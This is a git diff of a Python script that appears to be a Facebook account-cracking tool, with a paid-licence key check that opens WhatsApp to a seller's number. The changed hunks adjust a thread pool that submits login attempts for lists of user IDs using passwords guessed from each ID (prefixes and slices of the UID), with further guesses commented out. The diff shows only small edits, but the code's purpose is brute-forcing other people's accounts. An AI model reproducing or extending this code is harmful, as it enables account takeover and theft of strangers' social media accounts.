@@ -480,7 +480,7 @@ def ran():
     else:
         fb = "mbasic"
 
-    with ThreadPool(max_workers=60) as heron:
+    with ThreadPool(max_workers=20) as heron:
         sort.clear()
         sort.logo()
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
@@ -496,6 +496,7 @@ def ran():
             else:
                 pwx = [uid, uid[:6], uid[:8], xd[1:],
                uid[3:]]  # , "bangladesh", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "১২৩৪৫৬"]
+
             heron.submit(ren_sub, uid, pwx, meth, user, fb)
 
 
@@ -674,16 +675,16 @@ def approve():
         sys.exit("[!!] Internet Error...")
 
     if showkey in datax:
-
+        sort.clear()
         print("Checking Subscription")
-        time.sleep(3)
+        time.sleep(5)
         main()
     else:
         sort.logo()
 
         print("your Key ->   " + showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey);
+        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
         os.system('am start https://wa.me/+8801617687239?text=' + tks)
         sys.exit()
 
